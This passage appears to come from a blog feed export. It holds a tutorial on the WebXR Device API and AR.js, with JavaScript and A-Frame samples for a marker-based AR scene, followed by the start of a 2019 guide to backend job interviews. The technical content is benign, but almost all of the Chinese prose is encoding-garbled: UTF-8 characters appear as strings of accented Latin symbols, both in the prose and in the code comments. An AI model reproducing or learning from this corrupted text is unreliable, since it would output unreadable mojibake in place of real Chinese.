é‹ç”¨åˆ° WebXR Device API çš„æœ‰ Google ä½¿ç”¨çš„ three.ar.js èˆ‡æ•´åˆ A-Frame çš„ aframe-ar.jsï¼Œä»¥åŠ Mozilla ä¸»å°çš„ three.xr.js å’Œ aframe-xr.jsã€‚
Google æä¾›äº† WebARonARCore å’Œ WebARonARKit å…©ç¨®åˆ†åˆ¥åœ¨ Android èˆ‡ iOS å¹³å°ä¸Šé‹è¡Œçš„ç‰¹æ®Š browsersï¼Œè®“ä½ èƒ½åœ¨ä¸Šé¢è·‘ WebXR Device ç›¸é—œçš„ APIï¼šè€Œ Mozilla åœ¨ iOS ä¸Šä¹Ÿæ¨å‡º Mozilla WebXR Viewer ä¾†å°æ‡‰ï¼Œä¸‰è€…çš†æ˜¯ç”¨åˆ°æ‰‹æ©Ÿå¹³å°åŸç”Ÿçš„ ARKitã€‚
å¦‚åŒå‰›å‰›æ‰€èªªï¼ŒWebXR Device API é‚„å¾ˆä¸ç©©å®šï¼Œè€Œä¸” Google èˆ‡ Mozilla å„è‡ªåœ¨ Android èˆ‡ iOS ä¸Šæœ‰ä¸åŒçš„å¯¦ä½œï¼ŒGoogle code lab ä¸Šçš„ç¯„ä¾‹åªèƒ½é‹è¡Œåœ¨ version ç‚º 70 - 72 çš„ Chrome canary ä¸Šï¼Œè€Œ Mozilla é›–ç„¶æœ‰æ¨å‡º Mozilla WebXR Viewerï¼Œä½†ä¸Šé¢çš„ç¯„ä¾‹å¯¦ä½œä¹Ÿåªèƒ½é‹è¡Œåœ¨ Mozilla WebXR Viewer ä¸Šé ­â€¦
ä¸éå»çœ‹ä¸€ä¸‹é›™æ–¹çš„ç¯„ä¾‹ç¨‹å¼ç¢¼å¾Œï¼Œæœƒç™¼ç¾å…¶å¯¦ç”¨æ³•è »é›·åŒçš„ï¼Œå¤§å¤šéƒ½æœ‰ä¸‹é¢é€™äº›æµç¨‹ï¼ˆä»¥ Google çš„ç¨‹å¼ç¢¼ä¾†ç•¶ç¯„ä¾‹ï¼‰ï¼š
åˆ¤æ–·æ˜¯å¦æ”¯æ´ WebXR Device APIï¼Œä¸¦åˆå§‹è¨­å®šï¼š
/**   * Fetches the XRDevice, if available.   */  async init() &#123;    // `navigator.xr` æ˜¯ WebXR Device API çš„å…¥å£ï¼Œæœ‰å¿…è¦ç¢ºèªå…¶å­˜åœ¨    // è€Œ `XRSession` ä¸­çš„ `requestHitTest` å‰‡æ˜¯è¦ enable #webxr-hit-test flag    // ç¢ºèªé€™å…©å€‹ API å­˜åœ¨ï¼Œç¢ºä¿èƒ½å¤ è£½é€ å‡ºé»æ“Šç•«é¢    if (navigator.xr &amp;&amp; XRSession.prototype.requestHitTest) &#123;      try &#123;        this.device = await navigator.xr.requestDevice();      &#125; catch (e) &#123;        // Error handlingï¼Œé€šçŸ¥ä½¿ç”¨è€…çš„ç€è¦½å™¨ä¸¦ä¸æ”¯æ´        this.onNoXRDevice();        return;      &#125;    &#125; else &#123;      // Error handlingï¼Œé€šçŸ¥ä½¿ç”¨è€…çš„ç€è¦½å™¨ä¸¦ä¸æ”¯æ´      this.onNoXRDevice();      return;    &#125;    // æˆåŠŸå–å¾— XRDevice ç‰©ä»¶å¾Œï¼Œéœ€è¦ bind ä¸€å€‹ user gesture çš„ eventï¼Œç„¶å¾Œå‘¼å«    // `device.requestSession()`ï¼Œé€™æ˜¯è¦ç¯„åœ¨ spec  ä¸­çš„    document.querySelector(&#x27;#enter-ar&#x27;).addEventListener(&#x27;click&#x27;, this.onEnterAR);  &#125;

å–å¾— XRDevice å¾Œï¼Œåˆ©ç”¨ device.requestSession() è£½é€ å‡ºé‹è¡Œ XR çš„ç’°å¢ƒï¼š
async onEnterAR() &#123;  const outputCanvas = document.createElement(&#x27;canvas&#x27;);  const ctx = outputCanvas.getContext(&#x27;xrpresent&#x27;);  try &#123;    // `device.requestSession()` ä¸€å®šè¦æ˜¯ç”± user è§¸ç™¼ï¼Œåƒæ˜¯ click handler å…§    const session = await this.device.requestSession(&#123;      outputContext: ctx,      environmentIntegration: true,    &#125;);    document.body.appendChild(outputCanvas);    // æˆåŠŸå‰µå»º Session å¾Œå°±èƒ½é–‹å§‹é‹ç®— AR äº†    this.onSessionStarted(session)  &#125; catch (e) &#123;    // Error handlingï¼Œé€šçŸ¥ä½¿ç”¨è€…çš„ç€è¦½å™¨ä¸¦ä¸æ”¯æ´    this.onNoXRDevice();  &#125;&#125;

ç•¶ XRSession æˆåŠŸå‰µå»ºå¾Œï¼Œæ¥è‘—å°±æ˜¯ set up three.jsï¼Œæ’°å¯« rendererï¼Œè¨­å®š sceneã€cameraï¼Œä¸¦ attach ä¸Š XRWebGLLayerï¼Œç„¶å¾Œå•Ÿå‹• render loopï¼š
async onSessionStarted(session) &#123;  this.session = session;  // ...çœç•¥  // åˆ©ç”¨ Three.js ç¹ªè£½ 3D ç‰©ä»¶ï¼Œå› æ­¤è¦å€Ÿç”¨ THREE.WebGLRenderer ä¾†ç•¶ä½œ XRSession çš„ render layer  this.renderer = new THREE.WebGLRenderer(&#123;    alpha: true,    preserveDrawingBuffer: true,  &#125;);  // ...çœç•¥  //  è¨­å®š render layer  this.session.baseLayer = new XRWebGLLayer(this.session, this.gl);  const framebuffer = this.session.baseLayer.framebuffer;  this.renderer.setFramebuffer(framebuffer);  // ...çœç•¥, è¨­å®š scene  this.scene = DemoUtils.createLitScene();  // ...çœç•¥, è¨­å®š camera  this.camera = new THREE.PerspectiveCamera();  // ...çœç•¥, æ›´å¤šçš„è¨­å®š  // åœ¨ `requestAnimationFrame` ä¸­å•Ÿå‹• render loop  this.session.requestAnimationFrame(this.onXRFrame);  // ...çœç•¥&#125;

çœç•¥äº†å¾ˆå¤šç´°ç¯€ï¼Œä½†å¤§è‡´çš„æ­¥é©Ÿå°±æ˜¯é€™æ¨£ï¼Œè©³ç´°ç¨‹å¼ç¢¼åœ¨æ­¤ä¸‹è¼‰
å° WebXR Device API æ¯”è¼ƒæœ‰èˆˆè¶£çš„è®€è€…é™¤äº† Google code lab ä¸Šçš„ç¯„ä¾‹ç¨‹å¼èˆ‡ Mozilla çš„ webxr-ios-js ç¯„ä¾‹ å¤–ï¼Œä¹Ÿå¯ä»¥åˆ° immersive-web&#x2F;webxr çœ‹çœ‹è©² WebXR Device API çš„ Specs detail èˆ‡è§£é‡‹ï¼Œä»–å€‘ä¹Ÿæœ‰æä¾› Sample Page å¯ä½œåƒè€ƒã€‚
AR.jsç”±æ–¼æ‰‹é‚Šæ²’æœ‰é©åˆçš„ Android æ‰‹æ©Ÿï¼Œä¸èƒ½å˜—è©¦åˆ©ç”¨ WebXR Device APIï¼Œæ‰€ä»¥ä»Šå¤©å°±å…ˆä¾†çœ‹çœ‹ AR.js æœ‰å¤šç°¡å–®ã€‚
ä½ éœ€è¦çš„å°±åªæœ‰ï¼š

æº–å‚™å¥½ Marker
æº–å‚™å¥½ 3D models
æ’°å¯«åè¡Œç°¡å–®çš„ç¨‹å¼ç¢¼
host ä½ çš„ WebAR webapp

AR.js æœ‰æä¾›ä¸€å€‹ Marker generator - AR.js Marker Training

ä½ å¯ä»¥ä¸Šå‚³æƒ³è¦çš„åœ–ç‰‡æ”¾åˆ° Marker ä¸­ï¼Œä¾‹å¦‚ä¸€å€‹è¨˜è¼‰ä½ çš„ WebVR webapp ç¶²å€çš„ QR code å°±å¾ˆé©åˆã€‚åƒé€™ç¯‡æ–‡ç« ä½œè€…åˆ©ç”¨ AR.js çµåˆå¯¦é«”å¡ç‰‡é€çµ¦ä»–å¥³å‹ä¸€å€‹å°é©šå–œã€‚
æˆ‘å»ºè­°æŠŠä½ åšå¥½çš„ Marker ä¸‹è¼‰ä¸‹ä¾†ï¼Œå¦å‰‡ç•¶ä½ æ‰‹æ©Ÿå°è‘—é›»è…¦ä¸­çš„ marker æ™‚ï¼Œ3D Model æ–¹ä½è¦–è§’æœƒè·Ÿä½ æ˜¯å‚ç›´çš„ï¼Œä¸æ˜¯å¾ˆå¥½çœ‹ã€‚
æ¥è‘—å¯ä»¥åˆ° Poly æˆ–æ˜¯ sketchfab ä¸‹è¼‰ gltf çš„ 3D æ¨¡å‹ã€‚(æœå°‹æƒ³è¦çš„ Model æ™‚è¨˜å¾—å‹¾é¸ downloadableï¼Œæ¯”è¼ƒä¸æœƒé¸åˆ°éœ€è¦ä»˜è²»æ‰èƒ½ä¸‹è¼‰çš„ï¼Œç•¶ç„¶ä½ è¦ä»˜è²»ä¹Ÿå¾ˆæ£’ï¼)
ä»¥æˆ‘æœ€å‰é¢çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘åœ¨ sketchfab ä¸­è¼‰äº†ä¸€å€‹å‚‘å°¼é¾œçš„æ¨¡å‹

æ¥è‘—ç”¨ AR.js å°æ‡‰ AFrame çš„ extension æ’°å¯«ç°¡å–®çš„ WebVR app:
&lt;script src=&quot;https://aframe.io/releases/0.9.2/aframe.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.rawgit.com/jeromeetienne/AR.js/1.7.5/aframe/build/aframe-ar.js&quot;&gt;&lt;/script&gt;&lt;body style=&#x27;margin : 0px; overflow: hidden;&#x27;&gt;  &lt;a-scene embedded arjs=&#x27;sourceType: webcam; debugUIEnabled: false;&#x27;&gt;    &lt;a-marker type=&#x27;pattern&#x27; url=&#x27;assets/pattern-marker.patt&#x27;&gt;      &lt;a-entity position=&#x27;0 -6 -12&#x27; rotation=&quot;-20 0 0&quot; gltf-model=&quot;url(assets/scene.gltf)&quot;&gt;&lt;/a-entity&gt;    &lt;/a-marker&gt;  &lt;/a-scene&gt;&lt;/body&gt;

åœ¨ &lt;a-scene /&gt; ä¸­ï¼Œæˆ‘å€‘æŒ‡å®šä¸€å€‹ attribute arjsï¼Œä¸¦ä¸”è¨­å®š sourceType ç‚º webcamï¼Œç›¸é—œ attribute è¨­å®šå…¶å¯¦ä¾†è‡ª artoolkit systemï¼Œæœ‰éœ€è¦å¯ä»¥åˆ° GitHub çš„åˆ—è¡¨æŸ¥çœ‹ã€‚
æ¥è‘—æˆ‘å€‘é€é &lt;a-marker /&gt; æ”¾å…¥æˆ‘å€‘è£½ä½œçš„ markerï¼Œå‰¯æª”åç‚º .pattï¼Œé€™é‚Šçš„ type attributeï¼Œå¦‚æœä½ æ˜¯å–®ç´”ç”¨ barcode çš„è©±ï¼Œå¯ä»¥è¨­ç‚º type=barcodeï¼Œä½†è‹¥æ˜¯å®¢è£½åŒ–çš„ markerï¼Œå°±è¦è¨­ç‚º type=patternã€‚
æœ€å¾Œåœ¨ &lt;a-entity /&gt; ä¸Šé ­è¨­å®šæˆ‘å€‘æƒ³è¦å‘ˆç¾çš„ AR 3D Modelï¼Œgltf-model attribute è¨­å®šæ¨¡å‹çš„è·¯å¾‘ï¼Œå†é€é position èˆ‡ rotation ä¾†èª¿æ•´ä½ çš„æ¨¡å‹å‡ºç¾åœ¨é¡é ­çš„ä½ç½®ã€‚
é€™é‚Šç‰¹åˆ¥è¦æ³¨æ„ä¸€ä¸‹ï¼Œå› ç‚ºä½ è¼‰ä¸‹ä¾†çš„ 3D Modelï¼Œéƒ½æœ‰è‡ªå·±çš„ä½ç½®å±¬æ€§ï¼Œæ‰€ä»¥ä½ å¯èƒ½æœƒéœ€è¦è‡ªå·±å¤šåŠ èª¿æ•´å‡ºé©åˆçš„ position èˆ‡ rotation å€¼ï¼Œå¦å‰‡ä½ çš„ 3D Model å¾ˆå¯èƒ½ä¸€ç›´æˆåƒåœ¨ä½ æ‰‹æ©Ÿçš„é¡é ­å¤–è€Œçœ‹ä¸åˆ°ï¼Œç„¶å¾Œä½ é‚„ä»¥ç‚ºæ˜¯ç¨‹å¼å‡ºå•é¡Œâ€¦
ç•¶æ‰‹æ©Ÿé¡é ­åµæ¸¬åˆ° &lt;a-marker /&gt; å…§å°æ‡‰çš„ marker æ™‚ï¼Œå°±æœƒåœ¨é¡é ­å…§æ¸²æŸ“å‡º &lt;a-entiy /&gt;ã€‚
å¦‚æœåªæ˜¯åƒæˆ‘ä¸€æ¨£æƒ³è¦å˜—è©¦ä¸€ä¸‹çš„è©±ï¼Œå¯ä»¥ç°¡å–®åˆ©ç”¨ Chrome çš„ webapp - Web Server for Chrome ä¾† host ä½ çš„ htlm fileï¼Œç„¶å¾Œåˆ©ç”¨ ngork æˆ–æ˜¯ serveo ä¾†ç•¶ä½œä½  localhost çš„ proxyï¼Œè®“ä½ çš„æ‰‹æ©Ÿå¯ä»¥æ–¹ä¾¿ç›¸é€£ã€‚
ä¸€åˆ‡é †åˆ©çš„è©±ï¼Œä½ å°±æœƒçœ‹åˆ°ä¸€éš»å‚‘å°¼é¾œå‡ºç¾åœ¨ä½ å®¶è£¡å•¦ï½

å¦‚æœä½ æ²’æœ‰æ‰‹æ©Ÿå¯ä»¥ç©ï¼Œæƒ³ç”¨é›»è…¦ Browser è·‘çš„è©±ï¼Œæœƒéœ€è¦åˆ° chrome://flags ä¸­æŠŠ WebVR çš„é¸é …é–‹å•Ÿï¼Œç„¶å¾Œç”¨ inpsecter å°‡ Browser èª¿æ•´æˆæ‰‹æ©Ÿæ¨¡å¼ã€‚

ä¸¦ä¸”éœ€è¦åŠ ä¸Š polyfillï¼Œå› ç‚ºæ™®é€šçš„ chrome æ˜¯æ²’æœ‰æ”¯æ´ navigator.xr api çš„ï¼š
&lt;script src=&#x27;https://cdn.jsdelivr.net/npm/webxr-polyfill@latest/build/webxr-polyfill.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;  var polyfill = new WebXRPolyfill();&lt;/script&gt;


çµè«–é›–ç„¶ WebXR Device API é‚„ä¸ç©©å®šï¼Œä½†å°±æ˜¯åœ¨é€™æ™‚å€™é–‹å§‹è©¦ç”¨æ‰æ›´èƒ½çµ¦å‡ºå›é¥‹ï¼Œé«˜æ‰‹å€‘ä¾†è©¦è©¦å§ï¼æ±ºå®šä¸‹æ¬¡æ‹¿å…¬å¸æ¸¬è©¦æ©Ÿä¾†è·Ÿè‘— Code lab ä¸Šçš„ç¯„ä¾‹æ”¹æ”¹çœ‹ï¼å¦å¤–ï¼ŒAR.js é›–ç„¶ç›®å‰æ˜¯ Marker-basedï¼Œä½†å¾ GitHub ä¸Šçš„ä¸€äº›è¨è«– ä¾†çœ‹ï¼Œä¹‹å¾Œæ‡‰è©²æ˜¯æœ‰æ©Ÿæœƒæ”¯æ´ Markerless çš„ã€‚
AR é€™æ¨£ç‰½æ‰¯åˆ°é›»è…¦è¦–è¦ºã€ç¡¬é«”ã€æ¼”ç®—æ³•ã€Sensor ç­‰è¤‡é›œé‹ç®—çš„æŠ€è¡“ï¼Œè¦å¯¦ä½œåˆ° Web ä¸Šæ›´æ˜¯å›°é›£ï¼Œé€²åº¦æ…¢æ˜¯å¯ä»¥ç†è§£çš„ï¼Œä½†é‚„æ˜¯è¡·å¿ƒæœŸç›¼è‘—é‚£ä¸€å¤©ï¼Œèƒ½å¤ é–‹å•Ÿç¶²é å°±èƒ½ä¸ˆé‡å‚¢ä¿±å°ºå¯¸æˆ–æ˜¯è©¦ç©¿è¡£ç‰©ï¼
è³‡æ–™ä¾†æº
Repository for the WebXR Device API Specification.
Createï¼·ebVR
AR.js
AR.js â€” The Simplest Way to get Cross-Browser Augmented Reality on the Web
Building AR&#x2F;VR with Javascript and HTML
Web vs App (AR edition)
Poly
sketchfab
ç”¨ar-jsåšä¸€å€‹è®“å¦å°æ–¹-å–”å–”å–”å–”-çš„å°å¡ç‰‡å§
google code lab - WebXR
WebXR Sample page

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
        <tag>ar</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Web Backend é¢è©¦ç¸½çµ</title>
    <url>/2019/10/04/web-backend-interview-in-2019/</url>
    <content><![CDATA[å‰è¨€æœƒæƒ³åˆ†äº«é€™ç¯‡æ•´ç†ï¼Œä¸»è¦æ˜¯å› ç‚ºä»Šå¹´æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é¢è©¦å·¥ä½œï¼Œåœ¨æº–å‚™æœŸé–“æˆ‘æ›¾ç„¡æ¯”ç„¦æ…®ï¼Œçœ‹éä¸€ç¯‡åˆä¸€ç¯‡çš„é¢ç¶“ï¼Œç¸½è¦ºå¾—æ€éº¼é‚„æ˜¯é€™éº¼å¤šä¸æ‡‚çš„ï¼Œè€Œä¸”çœ‹äº†ä¹Ÿæœªå¿…åœ¨é¢è©¦ä¸­å›ç­”å¾—å‡ºä¾†ï¼Œå¾Œä¾†æˆ‘ç™¼ç¾ï¼ŒåŸä¾†æ˜¯å°æ–¼é¢è©¦æœƒè€ƒå“ªäº›é¡åˆ¥çš„å•é¡Œæ²’æœ‰æ¦‚å¿µï¼Œæ‰€ä»¥æ‰æ„Ÿåˆ°ç„¦æ…®ã€‚å¸Œæœ›é€éé€™ç¯‡å¾Œç«¯é¢è©¦ç¸½çµï¼Œè®“å³å°‡ä¸Šè·¯æˆ–æ˜¯æ­£åœ¨é€”ä¸­çš„äººï¼Œå¯ä»¥æœ‰å€‹æ–¹å‘ï¼ŒçŸ¥é“å¦‚ä½•æº–å‚™ï¼
æˆ‘æœƒå°‡å¾Œç«¯é¢è©¦åˆ†ç‚ºå…­å¤§é¡ï¼š

æ¼”ç®—æ³•ï¼ˆAlgorithmï¼‰
ç¨‹å¼èªè¨€ï¼ˆProgramming Languageï¼‰
ä½œæ¥­ç³»çµ±ï¼ˆOperating Systemï¼‰
ç¶²è·¯ï¼ˆNetworkï¼‰
ç³»çµ±è¨­è¨ˆï¼ˆSystem Designï¼‰
ç‰¹å®šè»Ÿé«”ï¼ˆåƒæ˜¯ MySQL, Redis ç­‰ï¼‰

ä»¥ä¸‹æœƒé‡å°é€™å…­å¤§é¡ï¼Œåˆ†åˆ¥ä»‹ç´¹ä¸¦æä¾›ä¸€äº›æº–å‚™çš„è³‡æºï¼
æ¼”ç®—æ³•ï¼ˆAlgorithmï¼‰æ¼”ç®—æ³•è€ƒé¡Œå°±æ˜¯å¤§å®¶å¸¸èªªçš„ LeetCodeï¼Œæˆ‘é¢è©¦çš„å…¬å¸ä¸­ï¼Œæœ‰çš„æ¯ä¸€é—œéƒ½æœ‰é¡ä¼¼ LeetCode çš„è€ƒé¡Œï¼Œæœ‰çš„å‰‡æœƒæŠŠé€™é¡è€ƒé¡Œé›†ä¸­åœ¨ç¬¬ä¸€é—œã€‚é—œæ–¼ LeetCode è€ƒé¡Œï¼Œæœƒå»ºè­°åˆ¥æ€¥è‘—åˆ·é¡Œï¼Œå…ˆæŠŠæ¼”ç®—æ³•çš„ç†è«–èˆ‡æ‡‰ç”¨ç†è§£å¾Œï¼Œå†é–‹å§‹åˆ·é¡Œï¼Œæ•ˆç‡æœƒæ›´å¥½ï¼
é‡å°ç†è§£æ¼”ç®—æ³•ï¼Œæœƒæ¨è–¦*æ¥µå®¢æ™‚é–“ - æ•¸æ“šçµæ§‹èˆ‡ç®—æ³•ä¹‹ç¾*ï¼Œæˆ‘è¦ºå¾—é€™æ˜¯åœ¨ã€Œæœ‰é™æ™‚é–“å…§ã€æº–å‚™æ¼”ç®—æ³•çš„å¥½æ•™æï¼åœ¨ä»‹ç´¹æ¯å€‹æ¼”ç®—æ³•ä¹‹å‰ï¼Œä½œè€…éƒ½æœƒä»¥ä¸€å€‹å¯¦éš›æ‡‰ç”¨çš„å•é¡Œé–‹é ­ï¼Œåƒæ˜¯ä»‹ç´¹ Stack æ™‚ï¼Œä½œè€…æœƒå…ˆå•ã€Œå¦‚ä½•å¯¦ç¾ç€è¦½å™¨ä¸­ä¸Šä¸€é ã€ä¸‹ä¸€é çš„åŠŸèƒ½ï¼Ÿã€ï¼Œç„¶å¾Œæ‰ä»‹ç´¹ Stackï¼Œæœ€å¾Œå†é‡å°é–‹é ­çš„å•é¡Œè§£ç­”ï¼Œé€™ç¨®å­¸ç¿’æ–¹å¼èƒ½è®“è®€è€…å° Stack èƒ½è™•ç†å“ªé¡å‹çš„å•é¡Œæ›´æœ‰æ„Ÿè¦ºï¼å¾ˆå¤šæ™‚å€™é¢è©¦ä¸­çš„å•é¡Œä¸¦ä¸æ˜¯ç›´æ¥çµ¦ input å’Œ outputï¼Œè€Œæ˜¯çµ¦ä¸€å€‹æ‡‰ç”¨æƒ…å¢ƒï¼Œé€™æ™‚å€™å¸¶è‘—ä½œè€…çµ¦çš„å•é¡Œå­¸ç¿’ï¼Œæ•ˆæœæœƒæ¯”è¼ƒå¥½ï¼
é‡å°åˆ·é¡Œï¼Œæˆ‘æœƒæ¨è–¦ä»¥ä¸‹é€£çµï¼š

LeetCode Learnï¼Œé€™è£¡æœ‰é‡å°åŸºç¤ç®—æ³•æ•´ç†å‡ºä¾†çš„è€ƒé¡Œï¼Œåƒæ˜¯ Queue &amp; Stack, Linked List, Hash Table ç­‰ï¼Œå°æ–¼ä¸€é–‹å§‹èªè­˜é¡Œå‹èˆ‡èªè­˜è§£é¡ŒæŠ€å·§æœ‰å¾ˆå¤§çš„å¹«åŠ©ã€‚
TechBridge - LeetCode åˆ·é¡Œ Patternï¼Œå¦‚æœå¤šåˆ·é»é¡Œï¼Œæœƒç™¼ç¾ä¸åŒçš„é¡Œå‹å¸¸å¸¸ç”¨åˆ°ä¸€æ¨£çš„æŠ€å·§ï¼Œé€™æ™‚å€™èªè­˜åˆ·é¡Œ Pattern å°±å¾ˆæœ‰å¹«åŠ©ï¼Œé€éåˆ·é¡Œ Pattern å¯ä»¥çŸ¥é“å“ªäº›é¡å‹çš„å•é¡Œï¼Œéƒ½å¯ä»¥ç”¨åŒæ¨£çš„ Pattern è™•ç†ï¼
LeetCode Interviewï¼Œæœ€å¾Œå°±æ˜¯é‡å°æƒ³è¦çš„å…¬å¸æº–å‚™ï¼Œå¦‚æœ LeetCode æ²’æœ‰æ•´ç†åˆ°çš„ï¼Œå¯ä»¥ç›´æ¥æœå°‹ã€ŒæŸæŸå…¬å¸ é¢ç¶“ã€ï¼Œé¢ç¶“ä¸­æåˆ°çš„é¡Œç›®é›–ç„¶ä¸æœƒä¸€ç›´é‡è¤‡å‡ºï¼Œä½†é¢è©¦å‰å…ˆçœ‹éä»¥å¾€é¡Œç›®çš„é›£åº¦ï¼Œå¿ƒè£¡è‡³å°‘æœƒæœ‰å€‹åº•ã€‚

ç¨‹å¼èªè¨€ï¼ˆProgramming Languageï¼‰ç¨‹å¼èªè¨€çš„éƒ¨åˆ†ï¼Œæœƒå»ºè­°å…ˆçœ‹éæ‹›è˜èªªæ˜ï¼Œé€šå¸¸æœƒæåˆ°å¸Œæœ›é¢è©¦è€…æœƒå“ªäº›èªè¨€ï¼Œé€™æ™‚å€™å†é‡å°é‚£å€‹èªè¨€æœå°‹ã€ŒæŸæŸèªè¨€ é¢ç¶“ã€ï¼Œåƒæ˜¯ Python é¢ç¶“ã€NodeJS é¢ç¶“ç­‰ã€‚é€™éƒ¨åˆ†é€šå¸¸æœƒé‡å°è©²èªè¨€çš„ç‰¹æ€§æå•ï¼Œä¾‹å¦‚ Python çš„ Immutable v.s. Mutable æˆ–æ˜¯ NodeJS Event Loop ç­‰ï¼Œé€šå¸¸æ¯å€‹èªè¨€éƒ½æœƒæœ‰å€‹ç¶“å…¸è€ƒé¡Œæ˜¯åƒåœ¾å›æ”¶æ©Ÿåˆ¶ï¼ˆGarbage Collectionï¼‰ï¼Œæœ€å¾Œè¦æ™‚å¸¸é—œæ³¨èªè¨€çš„ Latest Released æœ‰æ²’æœ‰åŠ å…¥å“ªäº›æ–°ç‰¹æ€§ï¼Œé€™äº›ä¹Ÿå¾ˆå®¹æ˜“æˆç‚ºé¢è©¦é¡Œç›®ï¼
ä½œæ¥­ç³»çµ±ï¼ˆOperating Systemï¼‰ä½œæ¥­ç³»çµ±çš„ç¶“å…¸è€ƒé¡Œå¦‚ä¸‹ï¼š

Process v.s. Thread v.s. Coroutine
Inter-Process Communication
èª¿åº¦ç­–ç•¥ï¼ˆSchedulerï¼‰
æ­»é–ï¼ˆDeadlockï¼‰æ¢ä»¶ï¼Œä»¥åŠå¦‚ä½•è§£æ­»é–

ä½œæ¥­ç³»çµ±çš„è€ƒé¡Œå¾ˆå¤§å¾ˆé›œï¼Œæœ‰æ™‚é–“çš„è©±ï¼Œå¯ä»¥é‡æ–°æ‰“åŸºç¤ç¿»é–±æé¾æœ¬ï¼ˆOperating System Conceptsï¼‰ï¼Œä½†æ²’æ™‚é–“çš„è©±ï¼Œå»ºè­°å¯ä»¥ä¸Šç¶²çœ‹åˆ¥äººçš„æ•´ç†ï¼Œåƒæ˜¯æƒ³ç†è§£ Process v.s. Thread v.s. Coroutine ç›¸é—œçš„å•é¡Œï¼Œå¾ˆæ¨è–¦ *Scheduling In Go ç³»åˆ—æ–‡ç« *ï¼Œé™¤äº†èªªæ˜ Golang æ€éº¼å¯¦ç¾ Coroutineï¼Œä¹Ÿé †ä¾¿ç†è§£ Golang æ€éº¼æŠŠ IO-Bound çš„å•é¡Œè½‰åŒ–ç‚º CPU-Boundã€‚
ç¶²è·¯ï¼ˆNetworkï¼‰ç¶²è·¯ç›¸é—œçš„ç¶“å…¸è€ƒé¡Œå¦‚ä¸‹ï¼š

TCP ä¸‰æ¬¡æ¡æ‰‹èˆ‡å››æ¬¡æ®æ‰‹éç¨‹ï¼Œç‚ºä»€éº¼è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿç‚ºä»€éº¼è¦å››æ¬¡æ®æ‰‹ï¼Ÿ
TCP v.s. UDP
TCP å¦‚ä½•å¯¦ç¾æµé‡æ§åˆ¶
HTTP æœ‰å“ªäº›ç‹€æ…‹ç¢¼
HTTP v.s. HTTPS
HTTPS åŠ å¯†éç¨‹
HTTP v.s. HTTP2
ç€è¦½å™¨æ‰“é–‹ç¶²é çš„éç¨‹

è—‰ç”±ç¶²è·¯ç›¸é—œè€ƒé¡Œï¼Œæ¨è–¦ä¸€å€‹é¢è©¦æŠ€å·§ - å¦‚æœå…©å€‹é …ç›®ä¹‹é–“æœ‰æ¼”é€²é—œä¿‚ï¼Œå…ˆèªªå‰ä¸€é …æŠ€è¡“é‡åˆ°ä»€éº¼å•é¡Œï¼Œå†èªªå¾Œä¸€é …æŠ€è¡“æ€éº¼è§£æ±ºã€‚ä»¥ã€ŒHTTP v.s. HTTPSã€ç‚ºä¾‹ï¼Œä¸è¦åªæ˜¯å›ç­”ã€ŒHTTPS æœ‰åŠ å¯†ã€ï¼Œè€Œæ˜¯å…ˆèªªæ˜ HTTP é‡åˆ°ä»€éº¼å•é¡Œï¼š

ç„¡æ³•é©—è­‰èº«ä»½
è¨Šæ¯æ²’åŠ å¯†
ç„¡æ³•é©—è­‰è¨Šæ¯å®Œæ•´æ€§

ç„¶å¾Œå†èªªæ˜å¾Œä¸€é …æŠ€è¡“ HTTPS å¦‚ä½•è§£æ±ºé€™äº›å•é¡Œï¼š

éå°ç¨±åŠ å¯† - é©—è­‰èº«ä»½
å°ç¨±åŠ å¯† - å°‡è¨Šæ¯åŠ å¯†
é›œæ¹Šï¼ˆHashï¼‰- é©—è­‰è¨Šæ¯å®Œæ•´æ€§

ç³»çµ±è¨­è¨ˆï¼ˆSystem Designï¼‰ç³»çµ±è¨­è¨ˆæ˜¯æˆ‘è¦ºå¾—æœ€æ²’æœ‰æ¨™æº–ç­”æ¡ˆçš„é¡Œç›®ï¼ŒåŸå› æ˜¯åªè¦ä¸€å€‹æ–°æŠ€è¡“æ²’æœ‰å–ä»£èˆŠæŠ€è¡“ï¼Œé‚£å…©ç¨®æŠ€è¡“é–“å°±æœƒæœ‰é¸æ“‡æ¬Šè¡¡çš„å•é¡Œï¼Œåƒæ˜¯ SQL v.s. NoSQLã€Process v.s. Threadï¼Œå…©ç¨®æŠ€è¡“é–“æ²’æœ‰çµ•å°çš„å¥½èˆ‡å£ï¼Œåªæœ‰é©ä¸é©åˆæŸç¨®æƒ…å¢ƒè€Œå·²ï¼Œè€Œç³»çµ±è¨­è¨ˆç›¸é—œçš„å•é¡Œï¼Œå°±æ˜¯è¦åˆ†æå„ç¨®ä¸åŒçµ„åˆçš„æŠ€è¡“ï¼Œä¸¦èªªæ˜ç‚ºä»€éº¼è¦é¸æŸä¸€ç¨®çµ„åˆã€‚
ç”±æ–¼å¤§å¤šæ•¸å­¸æ ¡æ²’æœ‰ç³»çµ±è¨­è¨ˆç›¸é—œçš„èª²ç¨‹ï¼Œæ‰€ä»¥æˆ‘æœƒæ¨è–¦å…ˆçœ‹*æ¥µå®¢æ™‚é–“ - å¾ 0 é–‹å§‹å­¸æ¶æ§‹*ï¼Œé€™å€‹å°ˆæ¬„æœ‰é»åƒç³»çµ±è¨­è¨ˆçš„å·¥å…·ç®±ï¼Œä»‹ç´¹ä¸åŒç¨®é¡çš„å•é¡Œæœ‰å“ªäº›è§£æ±ºæ–¹å¼ï¼Œå…ˆè¦çŸ¥é“æœ‰å“ªäº›å·¥å…·å¯ä»¥ç”¨ï¼Œé€™æ¨£çœ‹ç³»çµ±è¨­è¨ˆçš„å•é¡Œï¼Œæ‰ä¸æœƒè¦ºå¾—æ˜¯æ±è£œä¸€å¡Šè¥¿è£œä¸€å¡Šã€‚
